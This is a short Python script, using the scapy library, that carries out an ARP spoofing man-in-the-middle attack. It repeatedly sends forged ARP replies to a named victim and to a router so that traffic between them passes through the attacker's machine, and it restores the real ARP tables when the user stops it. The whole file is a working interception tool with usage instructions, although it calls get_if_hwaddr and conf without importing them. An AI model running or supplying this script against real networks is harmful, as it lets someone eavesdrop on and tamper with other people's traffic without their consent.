from scapy.all import ARP, send, getmacbyip
import sys

def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op="is-at", hwsrc=get_if_hwaddr(conf.iface), psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: python arp_spoof.py <victim_ip> <router_ip>")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]


    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    if victim_mac is None or router_mac is None:
        print("Could not find the MAC address of one of the targets.")
        sys.exit(1)

    try:
        print("Sending spoofed ARP packets. Press Ctrl+C to stop.")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        print("Restoration complete.")
        sys.exit(0)

if __name__ == "__main__":
    main()
